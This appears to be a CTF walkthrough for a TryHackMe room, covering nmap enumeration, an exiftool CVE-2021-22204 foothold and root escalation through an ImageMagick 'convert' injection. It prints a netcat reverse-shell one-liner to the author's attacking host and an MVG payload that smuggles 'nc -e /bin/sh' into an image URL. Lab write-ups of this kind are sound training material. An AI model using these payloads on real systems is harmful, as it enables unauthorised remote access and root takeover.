---
title: MystikoCTF - THM - Walkthrough
tags: web thm privesc web-exploitation privilege-escalation ImageMagick-vulnerability CVE-2021-22204 reverse-engineering nmap exploit-development binary-analysis
---

![photo_2021-02-10_22-58-30](https://user-images.githubusercontent.com/84577967/174065612-9a8249f1-005f-4ba3-a752-d4b1ed44df25.jpg){:.circle}

Date: 21<sup>st</sup> / 22<sup>nd</sup> November 2021

# Description

> This is my writeup for the recent CTF hosted by Mystiko, which was held on TryHackMe. I had a great time participating in the CTF and found it to be very challenging and enjoyable. I would like to express my gratitude to the Mystiko team for organizing such a fantastic event and for creating such a compelling and challenging machine.

- THM Link: [MystikoCTF2021](https://tryhackme.com/room/mystikoctf2021)

- Difficulty: <font size="3" color="orange">Medium</font>

Unfortunately, I did not have a lot of time to dedicate to the CTF, but I was still able to achieve a strong finish and share third place with `cryptonic007`.

# Enumeration

The CTF had 3 different webapps

> Only PIXEL, DEV01 and DEV02 are in scope for this CTF. Do NOT attack any other IP address or hostname.

As a first step in the process of identifying and analyzing the target system, it is a good idea to run `nmap`:

```bash
nmap -sCV 10.10.206.211 -vvv                                        
```

There are two open ports on the target: ports 22 (SSH) and 8080 (Nginx WebServer)

Let's dig into the webserver

![2021-11-22_16-15-23](https://user-images.githubusercontent.com/84577967/174065713-a0a47901-3b89-4414-a30e-02d3615dbe00.png)

Upon examining the web server, I found that it appears to be an image uploader. I opened the source code of the page to see if there were any hidden comments, but I did not find any. I also confirmed that the server is only accepting image files.

![2021-11-22_16-17-33](https://user-images.githubusercontent.com/84577967/174065741-f3cc5bfc-daf1-47f3-a4fd-2d14d9f6805e.png)

I uploaded an image and used Burp Suite to capture and analyze the traffic

![2021-11-22_16-21](https://user-images.githubusercontent.com/84577967/174065770-d9db02ce-0dc7-4446-b6f7-f514078ed2f4.png)

I attempted to manipulate the file extension and MIME type in various ways, but none of these methods seemed to have any effect. However, while reviewing the responses from the server, I noticed something interesting.

![2021-11-22_16-22](https://user-images.githubusercontent.com/84577967/174065788-51716dc6-0104-47b2-8582-22839af29029.png)

I discovered that there was a hidden HTML heading in the response that contained information about the picture I had uploaded, including the MIME type, size, and image dimensions. This heading also contained a strange value that appeared to be a version number, starting with `10.61` !

I suspected that this heading might be related to the `exiftool` tool, so I looked for any recent vulnerabilities in exiftool that I could potentially exploit. I came across `CVE-2021-22204`, which I had not previously had the opportunity to try.

# Foothold

I tried several different public CVEs in an attempt to find one that would be effective in this situation. After testing multiple options, I was finally able to identify a working exploit.

https://github.com/bilkoh/POC-CVE-2021-22204

With the working exploit in hand, I was able to use the following command line to create the malicious image:

![2021-11-22_16-52-54](https://user-images.githubusercontent.com/84577967/174065814-033ab445-5963-42a8-bed3-5bb71f6a41a4.png)

So the picture will download a file `shell.sh` from my webserver and execute it.

`shell.sh` : 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.95.202 9009 >/tmp/f
```

Let's upload the file 

![2021-11-21_13-29-19](https://user-images.githubusercontent.com/84577967/174065844-908a9f8d-be3d-4845-9b52-38593cb0fe39.png)

I set up a listener and then uploaded the malicious image to the server. As a result, I was able to successfully obtain a reverse shell.

![2021-11-22_16-56-09](https://user-images.githubusercontent.com/84577967/174065877-995382ea-7c6f-4bcb-999e-2fcc57128155.png)

Getting the first flag `local.txt` was pretty easy, the flag was in the home directory of our current user `pixel` and I was able to read it without any restrictions.

![2021-11-21_13-29-07](https://user-images.githubusercontent.com/84577967/174065895-f63a0342-78b3-413c-afe6-74034df064a5.png)

# Privilege Escalation

As a best practice, one of the first things I usually do after obtaining a reverse shell is to run the `sudo -l` command to check if there are any commands that I can execute using sudo.

![2021-11-21_13-30-34](https://user-images.githubusercontent.com/84577967/174065911-af8a4420-9d19-4ab2-8f98-74feca2b3ed2.png)

Perfect ! we have a binary called pixel . I copied this binary to my own machine in order to perform some reverse engineering and analysis.

![2021-11-21_13-31-02](https://user-images.githubusercontent.com/84577967/174065932-53d5f67c-92e4-4bf1-9ab0-20a30b8053ee.png)

I had to use ghidra, but I won't say much : nothing was interesting.

![2021-11-22_17-19-53](https://user-images.githubusercontent.com/84577967/174065960-2b860b8b-21c9-4215-8fc5-deff78ed1ef8.png)

I ran the binary on my own machine to performe some dynamic analysis.

![2021-11-21_13-31-10](https://user-images.githubusercontent.com/84577967/174065988-93c4886a-cd16-42d4-ae09-18656dc04771.png)

The binary appears to be an image toolkit created by the SIXER team. As part of my analysis, I chose to use the tool to convert an image to a PDF file and see what would happen.

![2021-11-21_13-32-36](https://user-images.githubusercontent.com/84577967/174066023-b2b56f4d-0d32-4cf4-b132-57be2cb43797.png)

The `Generating PDF` line show us that the binary is using the `/usr/local/bin/convert` tool to convert the image to a PDF. I had recently worked with a 2016 exploit involving `convert`, so I quickly returned to the Pixel machine to check the version of convert that was being used.

![2021-11-21_13-33-01](https://user-images.githubusercontent.com/84577967/174066040-8cc05195-ad7b-4a72-915a-ee83e6899263.png)

I was pleased to discover that the version of convert being used on the Pixel machine was indeed vulnerable to the exploit. By searching for ImageMagick exploit online, I was able to find a number of articles and resources that provided more information about this vulnerability and demonstrated various methods for exploiting it.

I followed these steps to exploit it:

1) Go to `/tmp/` directory.

1) Create a new file `exploit.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e "/bin/sh" "10.2.95.202" "9009)'
pop graphic-context
```
![2021-11-21_13-27-19](https://user-images.githubusercontent.com/84577967/174066067-cb5331e8-00a6-48d7-a851-cbfd26c9fb04.png)

2) Set my listener on port 9009:

```
  nc -lvnp 9009
```
3) Run `sudo /usr/bin/pixel` and follow the steps as the image shows (instead of `x.jpg` enter `exploit.mvg`)

![2021-11-21_13-32-36](https://user-images.githubusercontent.com/84577967/174066087-18504f00-3749-4129-90cc-5ab238b6514e.png)

4) Going back to my listener to check if I got a reverse shell:

![2021-11-21_13-35-30](https://user-images.githubusercontent.com/84577967/174066111-a6238dc3-d7b7-48a8-8e7e-474ade679153.png)

And yes ! I gained root access to the system and I was able to read the second flag `proof.txt`

![2021-11-22_17-34-28](https://user-images.githubusercontent.com/84577967/174066152-8befadde-2aea-4454-b8ca-e03a52150dc2.png)
